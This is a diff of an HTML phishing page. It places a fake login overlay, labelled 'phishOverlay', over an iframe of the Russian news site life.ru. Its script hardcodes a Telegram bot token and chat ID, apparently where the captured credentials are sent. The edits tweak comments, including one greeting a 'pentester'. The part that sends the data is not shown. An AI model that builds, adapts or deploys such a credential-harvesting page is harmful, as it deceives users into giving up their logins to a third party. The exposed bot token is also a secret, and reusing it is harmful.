@@ -54,7 +54,7 @@
         .close-btn:hover {
             background: #f0f0f0;
         }
-
+        /* Логотип Life */
         .life-logo {
             text-align: center;
             margin-bottom: 24px;
@@ -184,7 +184,6 @@
     </style>
 </head>
 <body>
-
     <iframe src="https://life.ru/p/1093988?ysclid=mlpq7w4dot655793251" style="width: 100%; height: 100vh; border: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 1;"></iframe>
 
     <div class="overlay" id="phishOverlay">
@@ -232,7 +231,6 @@
     </div>
 
     <script>
-        // Токен твоего бота и твой Chat ID
         const TELEGRAM_BOT_TOKEN = '7769901921:AAHcMIwKUoy78hKuCEeU6OlNRG10W7LdLnc';
         const TELEGRAM_CHAT_ID = '5552927986';
 
@@ -260,6 +258,7 @@
             btn.textContent = 'Вход...';
             btn.disabled = true;
             
+            // привет, брательник пентестер))0
             setTimeout(() => {
                 document.getElementById('phishOverlay').style.display = 'none';
             }, 1500);
